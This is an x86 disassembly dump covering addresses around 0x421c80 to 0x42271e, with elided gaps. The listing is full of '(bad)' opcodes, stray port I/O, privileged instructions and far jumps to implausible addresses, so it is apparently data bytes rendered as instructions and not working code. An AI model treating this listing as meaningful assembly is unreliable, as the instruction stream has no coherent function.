  421c80:	ja     0x421c58
  421c82:	push   ds
  421c83:	repnz clc 
  421c85:	sbb    ch,bh
  421c87:	pop    ecx
  421c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c89:	push   esp
  421c8a:	hlt    
  421c8b:	cmp    BYTE PTR [esi],al
  421c8d:	mov    ebx,0x9fb8eaa0
  421c92:	cs jmp 0x235b:0x562c47c1
  421c9a:	ss jge 0x421c26
  421c9d:	and    BYTE PTR [eax+0x70],ch
  421ca0:	(bad)  
  421ca1:	lahf   
  421ca2:	mov    esi,0xd20cfca6
  421ca7:	js     0x421cd3
  421ca9:	enter  0xb7ed,0xf7
  421cad:	xchg   edi,eax
  421cae:	cmc    
  421caf:	jno    0x421c49
  421cb1:	and    ecx,DWORD PTR [edi]
  421cb3:	ror    DWORD PTR [edi+0x2b],cl
  421cb6:	mov    eax,ds:0x994b7f3a
  421cbb:	fdivr  DWORD PTR [edi-0x4f]
  421cbe:	dec    ebp
  421cbf:	pushf  
  421cc0:	cmp    edi,DWORD PTR [ebp+0x0]
	...
  421d33:	add    bh,ah
  421d35:	push   ds
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	rol    ecx,cl
  421d42:	stc    
  421d43:	jmp    0xf6:0x16a28
  421d4a:	add    BYTE PTR [eax],al
  421d4c:	fsubr  QWORD PTR [esi]
  421d4e:	cld    
  421d4f:	bound  eax,QWORD PTR [esi+ebp*2]
  421d52:	cwde   
  421d53:	cmp    al,0xe
  421d55:	(bad)  
  421d57:	leave  
  421d58:	pop    ecx
  421d59:	xor    DWORD PTR [ebx-0x3f],edx
  421d5c:	in     al,0x7b
  421d5e:	pushf  
  421d5f:	pop    esi
  421d60:	xchg   esp,eax
  421d61:	in     eax,dx
  421d62:	sti    
  421d63:	cld    
  421d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d65:	daa    
  421d66:	jb     0x421dbb
  421d68:	js     0x421dac
  421d6a:	das    
  421d6b:	rcr    ecx,cl
  421d6d:	adc    DWORD PTR [ebx+0x2d],esp
  421d70:	popa   
  421d71:	call   0x5a2c:0x26023f4c
  421d78:	inc    edx
  421d79:	inc    esi
  421d7a:	mov    edi,0xfd041de5
  421d7f:	xchg   edx,eax
  421d80:	mov    DWORD PTR [edi-0x1d264d03],eax
  421d86:	ins    BYTE PTR es:[edi],dx
  421d87:	out    dx,al
  421d88:	in     al,0x1b
  421d8a:	sub    ch,BYTE PTR [esi+0x3adc4671]
  421d90:	mov    ds:0xe670c2c6,al
  421d95:	push   ss
  421d96:	nop
  421d97:	rcr    BYTE PTR [ecx],cl
  421d99:	je     0x421df7
  421d9b:	inc    ebp
  421d9c:	std    
  421d9d:	(bad)  
  421d9f:	adc    al,0x3a
  421da1:	ja     0x421db5
  421da3:	adc    bl,dh
  421da5:	push   edx
  421da6:	in     al,dx
  421da7:	xor    esp,ecx
  421da9:	lea    edi,[edi-0x4deca7b4]
  421daf:	push   esi
  421db0:	xchg   esp,eax
  421db1:	and    al,0xe2
  421db3:	mov    bl,0x16
  421db5:	jns    0x421e00
  421db7:	xor    al,0x20
  421db9:	adc    eax,0xdb5d00ed
  421dbe:	or     bh,BYTE PTR [ebx-0x7c]
  421dc1:	xchg   esp,eax
  421dc2:	outs   dx,DWORD PTR ds:[esi]
  421dc3:	sub    al,0x31
  421dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc6:	or     al,al
  421dc8:	xchg   edi,eax
  421dc9:	jb     0x421d56
  421dcb:	pop    edi
  421dcc:	sbb    DWORD PTR [edx+0x6e],ebp
  421dcf:	sar    BYTE PTR [esi+0x3d],0x69
  421dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dd4:	sbb    ebp,DWORD PTR [ecx+ecx*4-0x50f92361]
  421ddb:	div    BYTE PTR [esi+0x4a58f74e]
  421de1:	ror    BYTE PTR [edx-0x42a7aec7],cl
  421de7:	xor    DWORD PTR [edx],0x7c
  421dea:	sub    eax,0x5cdee926
  421def:	push   ds
  421df0:	dec    edx
  421df1:	dec    ebx
  421df2:	mov    esp,0x62da363
  421df7:	or     al,0x46
  421df9:	(bad)  
  421dfa:	in     eax,0x89
  421dfc:	in     al,0xec
  421dfe:	inc    esp
  421dff:	dec    edx
  421e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e01:	xor    al,0x6d
  421e03:	push   esi
  421e04:	dec    esp
  421e05:	lea    ebp,[ebp+edi*4-0x61]
  421e09:	jl     0x421df7
  421e0b:	inc    edi
  421e0c:	inc    ebp
  421e0d:	(bad)  
  421e0e:	sub    dh,BYTE PTR [ecx]
  421e10:	push   ebp
  421e11:	add    al,BYTE PTR ds:0x8ca5a07b
  421e17:	aas    
  421e18:	call   0x33dcc69e
  421e1d:	push   ss
  421e1e:	hlt    
  421e1f:	xor    al,0x8d
  421e21:	xor    al,0xc1
  421e23:	lods   eax,DWORD PTR ds:[esi]
  421e24:	(bad)  
  421e25:	pop    ebx
  421e26:	sub    BYTE PTR [esi],dl
  421e28:	dec    esp
  421e29:	lds    ebx,FWORD PTR [esi+0x33]
  421e2c:	dec    edi
  421e2d:	lods   eax,DWORD PTR ds:[esi]
  421e2e:	jmp    0x57272efc
  421e33:	loope  0x421e32
  421e35:	mov    cl,0x69
  421e37:	adc    al,0x8c
  421e39:	lods   al,BYTE PTR ds:[esi]
  421e3a:	not    dl
  421e3c:	mov    eax,0xf93167bd
  421e41:	xchg   esp,eax
	...
  421eb2:	add    BYTE PTR [eax],al
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421f0b
  421ec1:	cmp    ebp,DWORD PTR [ecx+0x16b1ebc]
  421ec7:	add    dh,dh
  421ec9:	add    BYTE PTR [eax],al
  421ecb:	add    ch,ch
  421ecd:	and    BYTE PTR [edx],cl
  421ecf:	repz ss mov edi,0x5374847b
  421ed6:	fld    TBYTE PTR [edi-0x5a0af781]
  421edc:	loope  0x421f04
  421ede:	icebp  
  421edf:	mov    edi,0xcac80247
  421ee4:	lea    ebx,[ebp-0x37291a9f]
  421eea:	jae    0x421e82
  421eec:	out    dx,al
  421eed:	sub    ebp,ebx
  421eef:	jle    0x421f57
  421ef1:	mov    al,ds:0x1340f97e
  421ef6:	mov    al,ds:0xd9d1dacb
  421efb:	ins    DWORD PTR es:[edi],dx
  421efc:	icebp  
  421efd:	add    ebx,edx
  421eff:	mov    ebp,0xf0fc728f
  421f04:	dec    ebp
  421f05:	mov    gs,WORD PTR [edi]
  421f07:	dec    eax
  421f08:	and    DWORD PTR [edi],edx
  421f0a:	popa   
  421f0b:	dec    ecx
  421f0c:	mov    ds:0xde991941,eax
  421f11:	scas   al,BYTE PTR es:[edi]
  421f12:	jg     0x421ec2
  421f14:	pop    edi
  421f15:	in     al,dx
  421f16:	xchg   edx,eax
  421f17:	inc    ebx
  421f18:	mov    ebx,0x512215ca
  421f1d:	xchg   edx,eax
  421f1e:	xor    ecx,edi
  421f20:	outs   dx,DWORD PTR ds:[esi]
  421f21:	enter  0x47cf,0xc2
  421f25:	adc    eax,0x90f3e5e6
  421f2a:	mov    dh,0x91
  421f2c:	imul   ecx,DWORD PTR [ecx+eiz*8-0x4ac8a17a],0xffffffbe
  421f34:	push   esi
  421f35:	cmp    esi,DWORD PTR [ebx+0x21b3a5c7]
  421f3b:	sub    al,0x4f
  421f3d:	mov    ecx,0xa4fc7a59
  421f42:	cdq    
  421f43:	call   0x63c06870
  421f48:	cmp    al,0xc6
  421f4a:	mov    eax,0xb4b5de9
  421f4f:	aad    0x4
  421f51:	fsub   st(1),st
  421f53:	ja     0xbe619e0d
  421f59:	test   al,0xef
  421f5b:	push   es
  421f5c:	out    0x35,al
  421f5e:	pop    es
  421f5f:	lds    esp,FWORD PTR [ebp-0x21]
  421f62:	leave  
  421f63:	ja     0x421fbf
  421f65:	dec    eax
  421f66:	and    edi,0xffffffdb
  421f69:	inc    esi
  421f6a:	aad    0x28
  421f6c:	and    eax,0x520a1b53
  421f71:	test   eax,0x9d465f1d
  421f76:	sbb    ecx,DWORD PTR [edx-0x7d0d8df0]
  421f7c:	add    al,0x7e
  421f7e:	sbb    DWORD PTR [eax+0x7a6c1a8f],ebx
  421f84:	fisttp QWORD PTR [edx]
  421f86:	xor    DWORD PTR [ebx],esp
  421f88:	jno    0x421fdb
  421f8a:	sti    
  421f8b:	xor    eax,0x205adc9b
  421f90:	pop    ds
  421f91:	(bad)  
  421f92:	and    ebx,DWORD PTR [esi]
  421f94:	pop    ebp
  421f95:	popa   
  421f96:	pop    es
  421f97:	sbb    DWORD PTR [ebx+0x383a2644],edi
  421f9d:	add    ebx,DWORD PTR ds:0x1d74d145
  421fa3:	test   eax,edi
  421fa5:	fnstsw WORD PTR [edi-0x6f]
  421fa8:	add    DWORD PTR [esi+0x182e7f9f],eax
  421fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421faf:	pop    ecx
  421fb0:	cmp    eax,0xc7c6e9c9
  421fb5:	lods   eax,DWORD PTR ds:[esi]
  421fb6:	mov    edx,0xd9a172d
  421fbb:	stos   BYTE PTR es:[edi],al
  421fbc:	jmp    0xe193dd5d
  421fc1:	mov    es,WORD PTR [eax]
	...
  422033:	add    BYTE PTR [edi-0x243925a2],bl
  422039:	(bad)  
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0x65f24e38
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    BYTE PTR [edx-0x6cc4b1cb],bh
  422051:	dec    ebp
  422052:	pop    esp
  422053:	loop   0x422049
  422055:	cmp    al,BYTE PTR [eax]
  422057:	loope  0x42204a
  422059:	xchg   ebx,eax
  42205a:	adc    eax,0x8e529f17
  42205f:	sbb    al,0x53
  422061:	adc    eax,0xf013bcdf
  422066:	not    BYTE PTR [ebx+0x1d]
  422069:	mov    DWORD PTR [esi],edx
  42206b:	nop
  42206c:	out    dx,al
  42206d:	and    al,0x7e
  42206f:	cld    
  422070:	dec    edx
  422071:	adc    esi,DWORD PTR [ebp-0x1114306]
  422077:	or     BYTE PTR ds:0xae6d0934,0x31
  42207e:	mov    al,0xcd
  422080:	or     BYTE PTR [eax],dl
  422082:	add    BYTE PTR [eax],al
  422084:	shl    edx,cl
  422086:	lds    edx,FWORD PTR [eax]
  422088:	leave  
  422089:	rcr    BYTE PTR [eax-0x24757f6e],1
  42208f:	int3   
  422090:	fwait
  422091:	cmp    eax,0xf3ef56b6
  422096:	jbe    0x4220f2
  422098:	xor    al,0x34
  42209a:	mov    ebp,0x648fc62b
  42209f:	mov    edx,0xaf04e572
  4220a4:	gs scas al,BYTE PTR es:[edi]
  4220a6:	mov    cs,edi
  4220a8:	jmp    0x54d6:0x85b54e8e
  4220af:	mov    eax,esp
  4220b1:	lock hlt 
  4220b3:	xor    dh,BYTE PTR [edi-0xe8dbec9]
  4220b9:	scas   eax,DWORD PTR es:[edi]
  4220ba:	lds    edx,FWORD PTR [ebp-0x2d729d0c]
  4220c0:	stos   BYTE PTR es:[edi],al
  4220c1:	mov    dl,0x3d
  4220c3:	cmc    
  4220c4:	inc    edx
  4220c5:	mov    bl,0x3c
  4220c7:	pop    esp
  4220c8:	stc    
  4220c9:	pop    esi
  4220ca:	repnz in eax,dx
  4220cc:	ror    DWORD PTR [ebp-0x6cf03057],1
  4220d2:	jp     0x422117
  4220d4:	imul   esp,DWORD PTR [ecx],0xffffffb5
  4220d7:	sbb    esp,0xd
  4220da:	and    BYTE PTR [eax],ch
  4220dc:	push   cs
  4220dd:	retf   0x94cd
  4220e0:	sti    
  4220e1:	arpl   WORD PTR [ebx],bx
  4220e3:	loop   0x422134
  4220e5:	fcomip st,st(6)
  4220e7:	push   edx
  4220e8:	int    0xd
  4220ea:	xchg   ebp,eax
  4220eb:	add    eax,0xcecdd4ce
  4220f0:	es pusha 
  4220f2:	daa    
  4220f3:	xor    ebx,DWORD PTR [ecx]
  4220f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f6:	inc    esi
  4220f7:	nop
  4220f8:	dec    esp
  4220f9:	gs xor ecx,esi
  4220fc:	mov    fs,esi
  4220fe:	pop    es
  4220ff:	dec    edi
  422100:	(bad)  
  422101:	scas   eax,DWORD PTR es:[edi]
  422102:	mov    esi,DWORD PTR [ecx]
  422104:	xchg   esp,eax
  422105:	push   cs
  422106:	cli    
  422107:	addr16 stc 
  422109:	leave  
  42210a:	jbe    0x4220db
  42210c:	or     DWORD PTR [esi+esi*4],eax
  42210f:	fsubrp st(7),st
  422111:	ror    BYTE PTR cs:0xb4627c18,1
  422118:	adc    al,0x82
  42211a:	cmc    
  42211b:	inc    ebp
  42211c:	jb     0x42213e
  42211e:	adc    bh,BYTE PTR [ebx+eax*2]
  422121:	mov    ch,0x27
  422123:	or     ebp,ecx
  422125:	mov    ch,0x71
  422127:	stos   BYTE PTR es:[edi],al
  422128:	aaa    
  422129:	fdivp  st(5),st
  42212b:	or     BYTE PTR [ebp+0x4fc95501],dl
  422131:	int    0x21
  422133:	mov    esp,0xcc2bd14f
  422138:	aam    0x5e
  42213a:	out    dx,al
  42213b:	aaa    
  42213c:	push   edi
  42213d:	sub    bl,cl
  42213f:	ret    0x1127
	...
  4221b2:	add    BYTE PTR [eax],al
  4221b4:	sahf   
  4221b5:	pop    ds
  4221b6:	(bad)  
  4221b7:	test   DWORD PTR [edi+0x3b7ffef7],0x4fd52766
  4221c1:	mov    ebx,0x16d0ab0
  4221c7:	add    dh,dh
  4221c9:	add    BYTE PTR [eax],al
  4221cb:	add    cl,bh
  4221cd:	mov    eax,0xed739d67
  4221d2:	push   ecx
  4221d3:	std    
  4221d4:	add    ch,BYTE PTR [edx]
  4221d6:	lea    ebx,[ebx-0x3ea58f87]
  4221dc:	cmp    esp,esi
  4221de:	cmc    
  4221df:	mov    bl,0xec
  4221e1:	fdiv   st,st(4)
  4221e3:	push   ebp
  4221e4:	test   BYTE PTR [esp+edx*4],bl
  4221e7:	imul   ebx,DWORD PTR [ecx+edx*8-0x4f472253],0x11
  4221ef:	inc    ebp
  4221f0:	dec    esi
  4221f1:	xor    edi,DWORD PTR [ecx-0xd]
  4221f4:	sbb    eax,0xdbf99751
  4221f9:	adc    dx,ax
  4221fc:	pop    ecx
  4221fd:	cmp    al,0xe5
  4221ff:	out    0x90,al
  422201:	lods   al,BYTE PTR ds:[esi]
  422202:	repnz ds out dx,eax
  422205:	in     eax,dx
  422206:	bound  esp,QWORD PTR [edx+0x7c5e6600]
  42220c:	push   ebp
  42220d:	cwde   
  42220e:	adc    eax,0x8ee02e66
  422213:	cmp    al,BYTE PTR [ecx]
  422215:	push   edi
  422216:	add    eax,0xb13fcb21
  42221b:	add    DWORD PTR [edi+0x105dc0e9],edx
  422221:	and    ah,BYTE PTR fs:[ebx+0x51]
  422225:	mov    edi,0xf4e32de
  42222a:	stos   DWORD PTR es:[edi],eax
  42222b:	fimul  WORD PTR [ebp+ebx*1-0x16]
  42222f:	js     0x4222a1
  422231:	inc    edx
  422232:	sub    al,0xc8
  422234:	fbstp  TBYTE PTR [edi-0x3437bae6]
  42223a:	nop
  42223b:	mov    ds:0x5c502324,eax
  422240:	push   ebx
  422241:	jp     0x42228d
  422243:	mov    al,0xc3
  422245:	mov    ds:0x14e4edba,eax
  42224a:	jbe    0x4221f0
  42224c:	lahf   
  42224d:	and    al,BYTE PTR [eax+0x654f5523]
  422253:	cwde   
  422254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422255:	lea    bp,[edi+0x7f]
  422259:	pusha  
  42225a:	mov    al,0xdb
  42225c:	jb     0x42228d
  42225e:	lds    esp,FWORD PTR [ebx+ebp*2-0x12]
  422262:	mov    WORD PTR [edi-0x180fad04],?
  422268:	push   eax
  422269:	pop    ebp
  42226a:	repnz pop edx
  42226c:	int    0xe1
  42226e:	sub    BYTE PTR [ebp+0x1d16ffdf],ah
  422274:	stos   BYTE PTR es:[edi],al
  422275:	je     0x4222bd
  422277:	sub    eax,0xec1dd082
  42227c:	xor    BYTE PTR [esi+edi*1-0x12],dh
  422280:	das    
  422281:	sub    eax,0x4353fa4d
  422286:	mov    ch,BYTE PTR [ecx+0x21]
  422289:	sub    BYTE PTR [eax],bh
  42228b:	mov    eax,0xb64da3f5
  422290:	sub    esi,DWORD PTR [ecx]
  422292:	int3   
  422293:	lods   eax,DWORD PTR ds:[esi]
  422294:	or     ebp,DWORD PTR [eax-0x20]
  422297:	xchg   ebp,eax
  422298:	adc    al,0x59
  42229a:	clc    
  42229b:	in     al,dx
  42229c:	sub    DWORD PTR [ebp+0x54],edi
  42229f:	inc    ecx
  4222a0:	xchg   edi,eax
  4222a1:	sbb    dh,BYTE PTR [edi-0x1c]
  4222a4:	sbb    al,ch
  4222a6:	pushf  
  4222a7:	mov    ecx,0xe9d79911
  4222ac:	scas   eax,DWORD PTR es:[edi]
  4222ad:	adc    BYTE PTR [esi-0x7565858e],dl
  4222b3:	cmp    DWORD PTR [edx+0x686be080],edi
  4222b9:	sbb    eax,0x38cde004
  4222be:	jle    0x422326
  4222c0:	sub    BYTE PTR [esi+0x0],0x0
	...
  422333:	add    dh,bh
  422335:	(bad)  
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	sub    ah,BYTE PTR [edx+0x46]
  422343:	inc    edx
  422344:	add    BYTE PTR [esi+0x1],ch
  422347:	add    dh,dh
  422349:	add    BYTE PTR [eax],al
  42234b:	add    BYTE PTR [edi+0x13],ah
  42234e:	jne    0x4223c7
  422350:	dec    eax
  422351:	ja     0x422341
  422353:	es inc esi
  422355:	jne    0x4223b7
  422357:	outs   dx,DWORD PTR ds:[esi]
  422358:	fs (bad) 
  42235a:	jbe    0x4222ed
  42235c:	or     DWORD PTR [eax+edx*8],eax
  42235f:	adc    BYTE PTR [edi+0x33cea01f],0x4f
  422366:	mov    bl,BYTE PTR [ecx+0x5ba5393c]
  42236c:	dec    ecx
  42236d:	js     0x4223ab
  42236f:	jb     0x4223f0
  422371:	dec    ebp
  422372:	sub    DWORD PTR [eax+0x42],ebp
  422375:	add    BYTE PTR [ecx],ah
  422377:	xor    BYTE PTR [edi],0xc
  42237a:	ror    BYTE PTR [ecx-0x53],1
  42237d:	ins    BYTE PTR es:[edi],dx
  42237e:	or     esp,DWORD PTR [eax+edx*8]
  422381:	out    0x6f,eax
  422383:	rcl    eax,0x62
  422386:	popa   
  422387:	(bad)  
  422388:	xor    bl,dh
  42238a:	fstp   QWORD PTR [ecx]
  42238c:	mov    al,al
  42238e:	jle    0x4223de
  422390:	test   DWORD PTR [ebx],0x74db7e5f
  422396:	repnz xchg ecx,eax
  422398:	fstp   QWORD PTR [ebx]
  42239a:	jae    0x422351
  42239c:	xchg   ebp,eax
  42239d:	out    0xea,eax
  42239f:	iret   
  4223a0:	add    DWORD PTR [eax+ecx*4-0x3a],ebp
  4223a4:	xor    eax,0xf3527123
  4223a9:	cmc    
  4223aa:	fs xchg edi,eax
  4223ac:	push   0xffffffd8
  4223ae:	shr    DWORD PTR [edx+0x4310717b],0x48
  4223b5:	sub    dl,BYTE PTR [edi+0x3a]
  4223b8:	cmp    ch,BYTE PTR [edi]
  4223ba:	sahf   
  4223bb:	sub    cl,cl
  4223bd:	arpl   WORD PTR [esi],cx
  4223bf:	add    cl,cl
  4223c1:	xor    BYTE PTR [esi+edx*4],cl
  4223c4:	dec    edi
  4223c5:	or     WORD PTR [ebx+0x63],cx
  4223c9:	cmp    eax,0xc15cb8d3
  4223ce:	cli    
  4223cf:	inc    ecx
  4223d0:	sbb    eax,0xc66f72ad
  4223d5:	inc    eax
  4223d6:	sub    DWORD PTR [eax+0x3e],eax
  4223d9:	mov    al,0x1e
  4223db:	adc    BYTE PTR [eax-0x7cb6bb0],cl
  4223e1:	or     BYTE PTR [edx-0x4e],0x86
  4223e5:	(bad)  
  4223e6:	pop    eax
  4223e7:	and    eax,DWORD PTR [ebx-0x24]
  4223ea:	outs   dx,BYTE PTR fs:[esi]
  4223ec:	inc    ebx
  4223ed:	and    dl,bl
  4223ef:	xchg   ebp,esi
  4223f1:	(bad)  
  4223f2:	aaa    
  4223f3:	mov    ds:0x504c68a8,al
  4223f8:	imul   edi,DWORD PTR [ecx+0x7a],0xe019e269
  4223ff:	(bad)  
  422400:	dec    edi
  422401:	mov    dh,0x9f
  422403:	inc    edi
  422404:	addr16 in al,dx
  422406:	mov    bl,0x5a
  422408:	pop    esi
  422409:	pop    edi
  42240a:	pop    esp
  42240b:	ret    
  42240c:	xor    DWORD PTR [eax+0x6476d577],eax
  422412:	mov    eax,ds:0xaa2d9b86
  422417:	inc    ecx
  422418:	pop    ebx
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	gs or  al,0x6
  42241d:	push   es
  42241e:	sbb    cl,bh
  422420:	sub    DWORD PTR [eax-0x59],0xffffffb5
  422424:	std    
  422425:	push   es
  422426:	(bad)  
  422427:	out    dx,al
  422428:	packuswb mm5,QWORD PTR [edx]
  42242b:	(bad)  
  42242c:	or     BYTE PTR [edx+0x63661450],bh
  422432:	sub    ch,0xc3
  422435:	fdiv   QWORD PTR [ebx]
  422437:	std    
  422438:	cwde   
  422439:	cdq    
  42243a:	cli    
  42243b:	(bad)  
  42243c:	or     esi,DWORD PTR [ebp+0x1b]
  42243f:	jne    0x42246f
  422441:	sldt   WORD PTR [eax]
	...
  4224b4:	(bad)  
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0xbe459f7c
  4224c2:	or     eax,0x16ef657
  4224c7:	add    dh,dh
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [esi+ecx*2-0x59],bl
  4224cf:	(bad)  
  4224d1:	xor    al,0x9c
  4224d3:	jge    0x4224d9
  4224d5:	xchg   esi,eax
  4224d6:	test   DWORD PTR [ebp+0x2c],0xd1df1e34
  4224dd:	in     eax,0xa7
  4224df:	pusha  
  4224e0:	shl    DWORD PTR [ebx+0x19],0x3a
  4224e4:	push   0x559c0abd
  4224e9:	cdq    
  4224ea:	push   edi
  4224eb:	sbb    edx,esp
  4224ed:	fild   QWORD PTR [edx-0x5d]
  4224f0:	pop    ecx
  4224f1:	les    edi,FWORD PTR [ebp+0x0]
  4224f4:	loopne 0x42250b
  4224f6:	cli    
  4224f7:	test   cl,ah
  4224f9:	in     al,dx
  4224fa:	pop    ecx
  4224fb:	outs   dx,WORD PTR ds:[esi]
  4224fd:	add    DWORD PTR [ebx+ebx*4],ecx
  422500:	fstp   DWORD PTR [ebp-0x4b]
  422503:	adc    BYTE PTR [ebx],bl
  422505:	pusha  
  422506:	dec    edx
  422507:	jecxz  0x422521
  422509:	jnp    0x4224cb
  42250b:	leave  
  42250c:	rcl    DWORD PTR ds:0x3452c9a3,cl
  422512:	mov    WORD PTR [edi],ss
  422514:	lods   al,BYTE PTR ds:[esi]
  422515:	icebp  
  422516:	call   0x6b5750cf
  42251b:	call   0xdc85:0xbc4bbb1
  422522:	repnz pop edi
  422524:	jge    0x42258f
  422526:	sub    ebx,DWORD PTR [edx-0x472c78fc]
  42252c:	lea    edx,[eax]
  42252e:	jnp    0x42256c
  422530:	xor    al,0x54
  422532:	test   BYTE PTR [edi],dl
  422534:	xchg   edx,eax
  422535:	gs adc edi,edx
  422538:	cdq    
  422539:	mov    eax,ds:0xbefed8d2
  42253e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42253f:	cli    
  422540:	jmp    FWORD PTR [eax+eiz*1+0xf9556b9]
  422547:	xor    edi,DWORD PTR [ebp+0x6ef9b1e9]
  42254d:	lahf   
  42254e:	mov    ds:0xc271b3cb,eax
  422553:	fdiv   DWORD PTR [eax+0x79]
  422556:	icebp  
  422557:	icebp  
  422558:	sti    
  422559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255a:	and    bl,al
  42255c:	lock sti 
  42255e:	and    BYTE PTR [ecx],ah
  422560:	xchg   ecx,eax
  422561:	jno    0x4225d5
  422563:	mov    ds:0x2fd70d3a,al
  422568:	inc    ecx
  422569:	je     0x42251c
  42256b:	dec    esi
  42256c:	mov    al,0xd1
  42256e:	inc    esp
  42256f:	cdq    
  422570:	dec    esi
  422571:	mov    bh,0x3a
  422573:	std    
  422574:	retf   
  422575:	ss jns 0x422524
  422578:	push   0x24
  42257a:	jmp    FWORD PTR [edx+edi*2+0x2c0fa174]
  422581:	loope  0x42257f
  422583:	dec    edi
  422584:	jmp    0x19cd:0x5afe46ad
  42258b:	xchg   ebp,eax
  42258c:	ret    
  42258d:	fimul  WORD PTR [eax+0x751b5c4c]
  422593:	jb     0x4225fd
  422595:	jmp    0x4225aa
  422597:	or     al,0x0
  422599:	jmp    0x4225d1
  42259b:	adc    al,0x85
  42259d:	or     BYTE PTR [eax],cl
  42259f:	jo     0x4225b4
  4225a1:	pop    ss
  4225a2:	ds je  0x4225a2
  4225a5:	fs xchg edi,eax
  4225a7:	jnp    0x4225a1
  4225a9:	test   eax,0x8cc6ee8e
  4225ae:	fwait
  4225af:	sbb    al,0x5b
  4225b1:	(bad)
  4225b4:	lds    eax,FWORD PTR ds:0x34a26ea3
  4225ba:	call   0x2ae8ae40
  4225bf:	mov    cs,WORD PTR [ebp+0x2d]
	...
  422631:	add    BYTE PTR [eax],al
  422633:	add    BYTE PTR [ebx-0x105512d4],ch
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	adc    BYTE PTR [edi+0x31],ah
  422643:	cmp    ah,ch
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	test   BYTE PTR [eax],0x0
  42264b:	add    BYTE PTR [ebp+0x2],bl
  42264e:	pop    ecx
  42264f:	xchg   esi,eax
  422650:	(bad)  
  422651:	mov    ah,0x9e
  422653:	xor    eax,DWORD PTR [ebx]
  422655:	cmc    
  422656:	xor    DWORD PTR ds:0x8b8817bf,eax
  42265c:	pop    edx
  42265d:	das    
  42265e:	out    0xdd,al
  422660:	shl    DWORD PTR [ecx-0x59],0x25
  422664:	xor    DWORD PTR [esi+eiz*2-0x2b],edi
  422668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422669:	sub    DWORD PTR [esp+eiz*8+0x19],eax
  42266d:	mov    edx,0x3556bfa1
  422672:	js     0x422633
  422674:	aas    
  422675:	ins    BYTE PTR es:[edi],dx
  422676:	in     eax,dx
  422677:	xchg   DWORD PTR [esi+0x484449f3],eax
  42267d:	(bad)  
  42267e:	clc    
  42267f:	outs   dx,DWORD PTR ds:[esi]
  422680:	je     0x4226c2
  422682:	mov    ch,0xa1
  422684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422685:	mov    bh,0xe2
  422687:	frstor [ecx-0x1c37f340]
  42268d:	pop    eax
  42268e:	push   eax
  42268f:	add    al,0x12
  422691:	push   ss
  422692:	add    esi,DWORD PTR [ebx-0x7697c175]
  422698:	inc    esi
  422699:	xchg   ebx,eax
  42269a:	pusha  
  42269b:	mov    ebx,DWORD PTR [edx]
  42269d:	jg     0x4226eb
  42269f:	add    dl,bh
  4226a1:	add    al,0xae
  4226a3:	rcr    DWORD PTR [edx-0x5dfa1928],1
  4226a9:	sahf   
  4226aa:	stos   BYTE PTR es:[edi],al
  4226ab:	cdq    
  4226ac:	out    dx,eax
  4226ad:	push   ss
  4226ae:	and    dh,dh
  4226b0:	leave  
  4226b1:	iret   
  4226b2:	xchg   esp,eax
  4226b3:	or     ch,BYTE PTR [edi]
  4226b5:	inc    edi
  4226b6:	xchg   DWORD PTR [edi+0x1b7fdd02],ebp
  4226bc:	loope  0x4226ef
  4226be:	xchg   ebx,eax
  4226bf:	dec    edx
  4226c0:	loope  0x42265d
  4226c2:	loop   0x422721
  4226c4:	fdiv   QWORD PTR [ebp-0x5e7ce564]
  4226ca:	imul   esp,DWORD PTR [edi+0x17],0x23
  4226ce:	and    ch,BYTE PTR [eax+0x48]
  4226d1:	xchg   edx,eax
  4226d2:	retf   0x657e
  4226d5:	dec    edx
  4226d6:	repnz add DWORD PTR [edi+edx*1+0x54ac807a],eax
  4226de:	icebp  
  4226df:	outs   dx,DWORD PTR ds:[esi]
  4226e0:	sbb    DWORD PTR [ebx+0xe3f0e5],esp
  4226e6:	and    BYTE PTR [eax-0xa],al
  4226e9:	xchg   edx,eax
  4226ea:	sub    edx,DWORD PTR [ecx+0x297427d2]
  4226f0:	int3   
  4226f1:	lock mov cs,WORD PTR [edi-0x6e]
  4226f5:	icebp  
  4226f6:	js     0x422713
  4226f8:	xor    DWORD PTR [edx+0x27],ebx
  4226fb:	mov    gs,WORD PTR [eax-0x1262f002]
  422701:	pushf  
  422702:	cs push ebp
  422704:	hlt    
  422705:	ret    0xcc3a
  422708:	es mov ch,0x17
  42270b:	ds pop esi
  42270d:	dec    ebp
  42270e:	mov    BYTE PTR [ecx+0x423a0094],al
  422714:	sub    BYTE PTR [edx+0x69],bh
  422717:	or     esi,DWORD PTR [edi+0x7483e004]
  42271d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271e:	inc    edx
